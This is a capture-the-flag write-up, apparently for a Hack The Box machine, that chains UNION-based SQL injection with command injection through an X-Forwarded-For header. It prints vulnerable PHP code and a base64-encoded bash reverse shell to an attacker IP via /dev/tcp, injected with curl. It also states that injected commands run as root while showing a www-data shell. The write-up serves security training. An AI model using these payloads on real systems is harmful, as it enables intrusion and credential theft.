### Union-Based SQL Injection

**Overview**

A UNION-based SQL injection abuses the `UNION` SQL operator to append the attacker's own `SELECT` statement to a vulnerable query, merging its results into the application's output. For this to work, the injected query must return the same number of columns as the original, and compatible data types. Once that's achieved, an attacker can pull arbitrary data from any table the database user can read — including other databases on the same server — simply by substituting the extra `SELECT` columns with the data they want (table names, column names, file contents via `LOAD_FILE()`, etc.).

Due to the "Player Eligibility Check" having context behind the page, this is where users should start their focus. Running SQLMap against both pages returns nothing of interest. However, entering players that have qualified for the UHC or the machine creator reveals that the error message: "Sorry, $name you are not eligible due to already qualifying." is returned. When testing for SQL Injections, you should always start with a payload that returns data because, in edge cases, returning no data may be handled the same as an error, which can create a false negative and lead to missing the injection.

### Command Injection via X-Forwarded-For

**Overview**

OS command injection happens when user-controlled input is concatenated directly into a string passed to a system shell function (`system()`, `exec()`, `shell_exec()`, etc.) without sanitization. Unlike SQL injection, there's no query parser to escape — whatever the attacker supplies becomes part of the literal command line, including shell metacharacters like `;`, `|`, or `&&` that chain additional commands.

Reviewing the source code of `firewall.php`, you'll notice the script takes the value of the **`X-Forwarded-For`** HTTP header and concatenates it directly into a system command (like `system()` or `exec()`) to execute `iptables` rules. The code looks similar to this:

```php
system("sudo /usr/sbin/iptables -A INPUT -s " . $_SERVER['HTTP_X_FORWARDED_FOR'] . " -j ACCEPT");
```

The parameter isn't sanitized, which allows a **Command Injection**. Anything you send in that HTTP header will be executed with the privileges assigned to that command (which, since it uses `sudo`, run as `root`).

To exploit it: since you can't inject directly from your SSH session as `uhc` because the code executes when an HTTP request is made, you have to force the server to process a malicious request locally. To achieve this, we'll use `curl` pointing at the machine itself (`localhost`), but **injecting a semicolon (`;`) into the `X-Forwarded-For` header** to break the original iptables command and force execution of an instruction that gives us Root permissions.

Before that we transform our reverse shell to base64:

```bash
# 1 reverse shell in base64
echo "bash -i >& /dev/tcp/10.10.16.65/4444 0>&1" | base64

# 2 Netcat Listener
nc -lnvp 4444

# 3 Exploit the Command Injection in the uhc user.
curl http://localhost/firewall.php -H 'X-Forwarded-For: ; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEK | base64 -d | bash #' -H 'Cookie: PHPSESSID=jd0r3v1okp72oaqgqa4ljfp6n8'
```

### Summary

**Attack Chain:**

1. **Web Enumeration** → Found a "Player Eligibility Check" form that queries a player handle against a database
2. **SQL Injection Discovery** → SQLMap returned nothing; manual testing with a data-returning payload revealed the error message leaking query behavior
3. **Union-Based SQLi Confirmation** → Intercepted the request in Burp Suite, confirmed column count and injected a UNION payload to read `/etc/passwd`, identifying users `htb` and `uhc`
4. **Database Enumeration** → Enumerated the current database name (`november`) and its tables (`flag`, `player`) via `information_schema`
5. **Flag Extraction** → Dumped the `flag` table and submitted it through the application
6. **SSH Activation** → Submitting the flag dynamically opened port 22 (previously closed)
7. **Config File Disclosure** → Used the same UNION injection to read the web app's config file, recovering plaintext MySQL/SSH credentials for `uhc`
8. **User Shell** → SSH'd in as `uhc`, captured user.txt
9. **Source Review** → Found `firewall.php`, which builds an `iptables` command using the unsanitized `X-Forwarded-For` header, run via `sudo`
10. **Command Injection** → Used `curl` against `localhost` with a semicolon-injected `X-Forwarded-For` header to break out of the iptables command and execute a base64-encoded reverse shell
11. **Shell as www-data** → Caught the reverse shell, landed as `www-data`
12. **Sudo Enumeration** → `sudo -l` showed passwordless `ALL` rights for `www-data`
13. **Root Shell** → `sudo su`, captured root.txt
